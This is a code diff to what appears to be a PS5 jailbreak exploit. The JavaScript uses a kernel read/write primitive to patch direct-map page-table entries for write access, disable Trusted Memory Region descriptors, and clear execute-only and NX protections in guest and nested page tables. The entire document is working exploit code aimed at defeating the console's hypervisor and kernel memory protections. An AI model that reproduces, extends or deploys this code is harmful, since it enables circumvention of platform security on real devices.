@@ -3,9 +3,8 @@
 // TMR/XOT Defeat for PS5 (FW 1.00-4.51)
 // Disables TMR descriptors, then clears XOTEXT+NX in guest and nested page tables.
 
-const ECAM_B0D18F2    = 0xF00C2000;
-const TMR_INDEX_OFF   = 0x80;
-const TMR_DATA_OFF    = 0x84;
+const TMR_INDIRECT_ADDR = 0xF00C2080;
+const TMR_INDIRECT_DATA = 0xF00C2084;
 const TMR_MAX         = 22;
 const TMR_CFG_PERMISSIVE = 0x3F07;
 const VMCB_NCR3       = 0xB0;
@@ -73,18 +72,53 @@ async function uartLog(p, chain, msg) {
 }
 
 // ---------------------------------------------------------------------------
-// TMR indirect register access (ECAM B0:D18:F2 + 0x80/0x84)
+// TMR indirect register access via DMAP
+// The DMAP page covering PA 0xF00C2xxx is mapped read-only — we patch the
+// PDE to add write access before TMR operations, then restore it.
 // ---------------------------------------------------------------------------
-function ecamAddr(dmap) { return dmapVA(dmap, new int64(ECAM_B0D18F2, 0)); }
+async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i) {
+    var pa = TMR_INDIRECT_ADDR;
+    var pdptIdx = (pa >>> 30) & 0x1FF;
+    var pdIdx = (pa >>> 21) & 0x1FF;
+
+    var pml4e = await krw.read8(guestPml4VA.add32(dmpml4i * 8));
+    if (!(pml4e.low & PTE_PRESENT)) throw new Error("DMAP PML4E not present");
+
+    var pdptBase = dmapVA(dmap, ptePA(pml4e));
+    var pdpte = await krw.read8(pdptBase.add32(pdptIdx * 8));
+    if (!(pdpte.low & PTE_PRESENT)) throw new Error("DMAP PDPTE not present for TMR");
+
+    if (pdpte.low & PTE_PS) {
+        if (!(pdpte.low & PTE_WRITE)) {
+            var entryAddr = pdptBase.add32(pdptIdx * 8);
+            var patched = new int64((pdpte.low | PTE_WRITE) >>> 0, pdpte.hi);
+            await krw.write8(entryAddr, patched);
+            return { addr: entryAddr, orig: pdpte };
+        }
+        return null;
+    }
+
+    var pdBase = dmapVA(dmap, ptePA(pdpte));
+    var pde = await krw.read8(pdBase.add32(pdIdx * 8));
+    if (!(pde.low & PTE_PRESENT)) throw new Error("DMAP PDE not present for TMR");
+
+    if (!(pde.low & PTE_WRITE)) {
+        var entryAddr = pdBase.add32(pdIdx * 8);
+        var patched = new int64((pde.low | PTE_WRITE) >>> 0, pde.hi);
+        await krw.write8(entryAddr, patched);
+        return { addr: entryAddr, orig: pde };
+    }
+    return null;
+}
 
 async function tmrReadReg(krw, dmap, off) {
-    await krw.write4(ecamAddr(dmap).add32(TMR_INDEX_OFF), off);
-    return await krw.read4(ecamAddr(dmap).add32(TMR_DATA_OFF));
+    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
+    return await krw.read4(dmap.add32(TMR_INDIRECT_DATA));
 }
 
 async function tmrWriteReg(krw, dmap, off, val) {
-    await krw.write4(ecamAddr(dmap).add32(TMR_INDEX_OFF), off);
-    await krw.write4(ecamAddr(dmap).add32(TMR_DATA_OFF), val);
+    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
+    await krw.write4(dmap.add32(TMR_INDIRECT_DATA), val);
 }
 
 // ---------------------------------------------------------------------------
@@ -118,12 +152,6 @@ async function tmrRelaxForPA(krw, dmap, pa, log) {
 
 async function tmrDefeat(krw, dmap, log) {
     var fw = window.fw_float;
-
-    var ecamTest = await krw.read4(ecamAddr(dmap));
-    log("ECAM dev id=0x" + ecamTest.toString(16), LogLevel.LOG);
-    if (ecamTest === 0 || (ecamTest >>> 0) === 0xFFFFFFFF) {
-        throw new Error("ECAM not accessible via DMAP (got 0x" + ecamTest.toString(16) + ")");
-    }
 
     var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
     if (tmr16Base === 0) throw new Error("TMR[16].base = 0 — can't find kernel PA");
@@ -333,13 +361,24 @@ async function disableTmrAndXot(krw, chain, log, p) {
 
     await dlog("DMAP base=0x" + dmap.toString(16), LogLevel.INFO);
 
-    await tmrDefeat(krw, dmap, dlog);
-
-    var ncr3 = await discoverNpt(krw, dmap, dlog);
-
     var pmapAddr = krw.ktextBase.add32(OFFSET_KERNEL_PMAP_STORE);
     var guestPml4VA = await krw.read8(pmapAddr.add32(OFFSET_KERNEL_PMAP_PM_PML4));
     if (guestPml4VA.low === 0 && guestPml4VA.hi === 0) throw new Error("Guest PML4 VA is 0");
+
+    var tmrPatch = await ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i);
+    if (tmrPatch) {
+        await dlog("Patched TMR DMAP PDE for write access", LogLevel.LOG);
+        await chain.syscall(SYS_SCHED_YIELD);
+    }
+
+    await tmrDefeat(krw, dmap, dlog);
+
+    if (tmrPatch) {
+        await krw.write8(tmrPatch.addr, tmrPatch.orig);
+        await chain.syscall(SYS_SCHED_YIELD);
+    }
+
+    var ncr3 = await discoverNpt(krw, dmap, dlog);
 
     await dlog("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);
 
